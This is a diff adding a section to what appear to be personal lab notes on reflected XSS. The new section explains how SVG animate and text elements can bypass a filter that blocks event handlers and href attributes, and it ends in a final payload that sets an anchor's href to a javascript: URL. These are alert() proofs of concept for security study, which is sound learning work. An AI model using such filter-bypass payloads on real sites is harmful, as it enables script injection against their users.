@@ -590,5 +590,31 @@ All tags are blocked, except custom tag
 tabindex=1 > #x > id=x > onfocus > alert()
 
 ___________________________________________________________________________________________________________________________________________________________________
+Reflected XSS with event handlers and href attributes blocked
+-------------------------------------------------------------
 
+Only a and animate elements are worked 
+
+<a href=alert(1)>clickme</a>
+
+href attribute is blocked due to the prevention of WAF
+
+
+The <animate> element is part of the SVG (Scalable Vector Graphics) specification. It is used to animate an attribute of an SVG element over time. 
+This element allows for creating simple or complex animations directly within SVG files without relying on external scripting or CSS animations.
+
+for example,
+
+<rect width="10" height="10">
+    <animate
+      attributeName="rx"
+      values="0;5;0"
+      dur="10s"
+
+animate element changes the value of <svg> rect attribute (rect=rectangle).
+
+text element in svg allows you to add text that can be styled, positioned, and transformed similarly to other SVG shapes.
+
+final payload -->  <svg><a><animate attributeName=href values='javascript:alert(1)'/><text x=20 y=20>clickme</text></a><svg>
+___________________________________________________________________________________________________________________________________________________________________
 
